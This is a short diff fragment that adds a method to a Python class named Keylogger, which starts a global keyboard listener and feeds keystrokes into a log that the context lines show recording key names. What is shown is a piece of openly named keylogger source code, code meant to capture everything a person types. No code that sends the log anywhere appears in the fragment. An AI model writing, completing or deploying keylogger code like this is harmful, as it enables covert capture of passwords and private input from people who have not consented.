@@ -20,3 +20,7 @@ class Keylogger:
             else:
                 self.log += f"[{key.name}]"
 
+    def _start_listener(self) -> None:
+        with keyboard.Listener(on_press=self._on_press) as listener:
+            self._listener = listener
+            listener.join()
